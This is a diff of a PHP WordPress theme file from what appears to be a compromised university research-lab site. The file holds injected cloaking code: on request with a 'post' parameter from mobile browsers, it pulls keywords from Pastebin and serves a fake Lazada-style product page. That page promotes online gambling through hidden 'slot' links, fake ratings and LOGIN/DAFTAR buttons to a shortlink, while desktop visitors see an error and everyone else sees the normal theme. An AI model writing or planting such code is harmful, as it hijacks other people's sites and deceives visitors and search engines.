@@ -1,48 +1,53 @@
-
 <?php
 // Cek jika ada parameter 'post'
 if (isset($_GET['post'])) {
+    // Sanitasi input
+    $target_string = strtolower(trim(strip_tags($_GET['post'])));
+
     // Deteksi apakah pengunjung adalah perangkat seluler
     $is_mobile = preg_match('/Mobile|Android|iPhone|iPad/i', $_SERVER['HTTP_USER_AGENT']);
 
     if (!$is_mobile) {
-        // Jika bukan perangkat seluler, tampilkan halaman kosong atau pesan
         header("HTTP/1.1 403 Forbidden");
-        echo "<h1>Error 404</h1>";
-        echo "<p>Looks like something went completely wrong. Don't worry, just hit the button to go back or browse our latest articles below.</p>";
-        exit; // Hentikan eksekusi lebih lanjut
+        echo "<h1>Error 403</h1>";
+        echo "<p>Sepertinya Anda tidak dapat mengakses halaman ini dari perangkat ini. Silakan coba lagi dengan perangkat seluler.</p>";
+        exit;
     }
+
     $filename = "https://pastebin.com/raw/mqCJTET3";
     $katafile = "https://pastebin.com/raw/mqCJTET3";
-    
-    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower($_GET['post']);   
-    $found = false;
-    $brand_index = null;
 
+    // Penanganan kesalahan untuk pengambilan file
+    $lines = @file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if ($lines === false) {
+        echo "<h1>Data tidak tersedia</h1>";
+        exit;
+    }
+
+    $found = false;
     foreach ($lines as $index => $item) {
         if (strtolower($item) === $target_string) {
             $BRAND = strtoupper($target_string);
-            $SMALLBRAND = $target_string;
             $found = true;
-            $brand_index = $index;
             break;
         }
     }
 
-    $kata_lines = file($katafile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $num_random_kata = 5; 
-    if (count($kata_lines) < $num_random_kata) {
-        $num_random_kata = count($kata_lines); 
+    // Ambil kata acak
+    $kata_lines = @file($katafile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if ($kata_lines === false) {
+        echo "<h1>Data kata tidak tersedia</h1>";
+        exit;
     }
+    
+    $num_random_kata = min(count($kata_lines), 5);
     $random_kata_keys = array_rand($kata_lines, $num_random_kata);
     $KATARANDOMS = array_map(function($key) use ($kata_lines) {
         return $kata_lines[$key];
     }, (array) $random_kata_keys);
-    
+
+    // Output HTML
     ?>
-
-
 
 <!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
@@ -58,13 +63,13 @@ if (isset($_GET['post'])) {
   <meta name="og:title" content="Website <?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?> Profil Laboratorium Riset" />
   <meta name="og:type" content="product" />
   <meta name="og:description" content="<?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?> dibuat dalam upaya memenuhi kebutuhan dosen dan mahasiswa dalam melaksanakan penelitian yang menjadi bagian dari Tridarma perguruan tinggi sesuai dengan standar laboratorium penelitian STIKes Widya Dharma Husada dan Permendikbud No. 3 Tahun 2020 pasal 35." />
-  <meta name="og:image" content="https://labriset.wdh.ac.id/wp-content/uploads/2024/10/logo-stikes-1-150x150.png" />
+  <meta name="og:image" content="https://faperta.umubuton.ac.id/wp-content/uploads/2023/06/SERTIFIKAT-AKREDITASI-AGROTEKNOLOGI_001.png" />
   <link rel="manifest" href="https:https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
-  <link rel="shortcut icon" href="https://labriset.wdh.ac.id/wp-content/uploads/2024/10/logo-stikes-1-150x150.png" />
+  <link rel="shortcut icon" href="https://faperta.umubuton.ac.id/wp-content/uploads/2023/02/download-150x150.png" />
   <link rel="canonical" href="https://labriset.wdh.ac.id/?post=<?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?>" />
   <link rel="amphtml" href="https://kukanggalon.pages.dev/chane/?page=<?php echo isset($SMALLBRAND) ? $SMALLBRAND : 'Tidak Ditemukan'; ?>">
   <!-- start preload -->
-  <link rel="preload" href="https://labriset.wdh.ac.id/wp-content/uploads/2024/10/logo-stikes-1-150x150.png" as="image" />
+  <link rel="preload" href="https://faperta.umubuton.ac.id/wp-content/uploads/2023/06/SERTIFIKAT-AKREDITASI-AGROTEKNOLOGI_001.png" as="image" />
   <link rel="preconnect dns-prefetch" href="https://cart.lazada.co.id" />
   <link rel="preconnect dns-prefetch" href="https://acs-m.lazada.co.id" />
   <link rel="preconnect dns-prefetch" href="https://laz-g-cdn.alicdn.com" />
@@ -3412,7 +3417,7 @@ if (!lzdDocCookies.getItem('t_uid')) {
 
   </div><a href="https://eaglehotelrestaurantbar.com" style="display: none;">slot</a>
   <div id="container" style="visibility: visible;">
-       <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="Website <?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?> Profil Laboratorium Riset" src="https://labriset.wdh.ac.id/wp-content/uploads/2024/10/logo-stikes-1-150x150.png"/></div></div><a href="https://t.ly/bangboslink" rel="nofollow noopener" target="_blank"><img src="https://smppjbintaro.sch.id/images/7_Program/pjcup_mircvicara/daftar-sekarang.png" width="100%" height="auto" alt=""></a><div class="next-slick next-slick-outer next-slick-horizontal item-gallery-slider"><div class="next-slick-inner next-slick-initialized" draggable="true"><div class="next-slick-list"><div class="next-slick-track"><div style="outline:none;width:52px" class="next-slick-slide next-slick-active next-slick-cloned item-gallery__thumbnail item-gallery__thumbnail_state_active" lazada_pdp_gallery_tpp_track="gallery" main_image_number="1" data-index="0" tabindex="-1"><div class="item-gallery__image-wrapper"></div></div></div></div><div data-role="none" class="next-slick-arrow next-slick-prev outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-left next-icon-medium"></i></div><div data-role="none" class="next-slick-arrow next-slick-next outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-right next-icon-medium"></i></div></div></div></div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title">Website <?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?> Profil Laboratorium Riset</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/></div><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0">8.832.900 Penilaian</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module"><div class="pdp-product-brand"><span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="https://labriset.wdh.ac.id/?post=<?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?>"><?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?></a><div class="pdp-product-brand__divider"></div><div class="pdp-cart-concern" bis_skin_checked="1"><a href="https://t.ly/bangboslink"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">LOGIN 🚀</span></button></a><a href="https://t.ly/bangboslink" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">DAFTAR 🚀</span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;3642482616&quot;,&quot;skuId&quot;:&quot;6108584955&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price"><p style="text-align: justify;"><?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?> dibuat dalam upaya memenuhi kebutuhan dosen dan mahasiswa dalam melaksanakan penelitian yang menjadi bagian dari Tridarma perguruan tinggi sesuai dengan standar laboratorium penelitian STIKes Widya Dharma Husada dan Permendikbud No. 3 Tahun 2020 pasal 35.</p>
+       <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="Website <?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?> Profil Laboratorium Riset" src="https://faperta.umubuton.ac.id/wp-content/uploads/2023/06/SERTIFIKAT-AKREDITASI-AGROTEKNOLOGI_001.png"/></div></div><a href="https://t.ly/bangboslink" rel="nofollow noopener" target="_blank"><img src="https://smppjbintaro.sch.id/images/7_Program/pjcup_mircvicara/daftar-sekarang.png" width="100%" height="auto" alt=""></a><div class="next-slick next-slick-outer next-slick-horizontal item-gallery-slider"><div class="next-slick-inner next-slick-initialized" draggable="true"><div class="next-slick-list"><div class="next-slick-track"><div style="outline:none;width:52px" class="next-slick-slide next-slick-active next-slick-cloned item-gallery__thumbnail item-gallery__thumbnail_state_active" lazada_pdp_gallery_tpp_track="gallery" main_image_number="1" data-index="0" tabindex="-1"><div class="item-gallery__image-wrapper"></div></div></div></div><div data-role="none" class="next-slick-arrow next-slick-prev outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-left next-icon-medium"></i></div><div data-role="none" class="next-slick-arrow next-slick-next outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-right next-icon-medium"></i></div></div></div></div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title">Website <?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?> Profil Laboratorium Riset</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/></div><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0">8.832.900 Penilaian</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module"><div class="pdp-product-brand"><span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="https://labriset.wdh.ac.id/?post=<?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?>"><?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?></a><div class="pdp-product-brand__divider"></div><div class="pdp-cart-concern" bis_skin_checked="1"><a href="https://t.ly/bangboslink"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">LOGIN 🚀</span></button></a><a href="https://t.ly/bangboslink" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">DAFTAR 🚀</span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;3642482616&quot;,&quot;skuId&quot;:&quot;6108584955&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price"><p style="text-align: justify;"><?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?> dibuat dalam upaya memenuhi kebutuhan dosen dan mahasiswa dalam melaksanakan penelitian yang menjadi bagian dari Tridarma perguruan tinggi sesuai dengan standar laboratorium penelitian STIKes Widya Dharma Husada dan Permendikbud No. 3 Tahun 2020 pasal 35.</p>
   </div>
   
   <script>
@@ -3830,39 +3835,27 @@ var gConfig = window.g_config || {};
 </script>
 </body>
 </html>
-
 <?php
-    exit; // Hentikan eksekusi lebih lanjut
+    exit;
 }
 
 // Jika tidak ada parameter yang dikenali, tampilkan halaman WordPress biasa
 get_header(); ?>
+<?php if ( astra_page_layout() == 'left-sidebar' ) : ?>
+    <?php get_sidebar(); ?>
+<?php endif ?>
+    <div id="primary" <?php astra_primary_class(); ?>>
+        <?php
+        astra_primary_content_top();
+        astra_content_loop();
+        astra_pagination();
+        astra_primary_content_bottom();
+        ?>
+    </div><!-- #primary -->
+<?php
+if ( astra_page_layout() == 'right-sidebar' ) :
+    get_sidebar();
+endif;
 
-<div class="td-main-content-wrap td-container-wrap">
-    <div class="td-container td-blog-index">
-        <div class="td-crumb-container">
-            <?php echo tagdiv_page_generator::get_breadcrumbs(array(
-                'template' => 'home',
-            )); ?>
-        </div>
-
-        <div class="td-pb-row">
-            <div class="td-pb-span8 td-main-content">
-                <div class="td-ss-main-content">
-                    <?php
-                        get_template_part('loop' );
-                        tagdiv_page_generator::get_pagination();
-                    ?>
-                </div>
-            </div>
-
-            <div class="td-pb-span4 td-main-sidebar">
-                <div class="td-ss-main-sidebar">
-                    <?php dynamic_sidebar( 'td-default' ) ?>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<?php get_footer(); ?>
+get_footer();
+?>
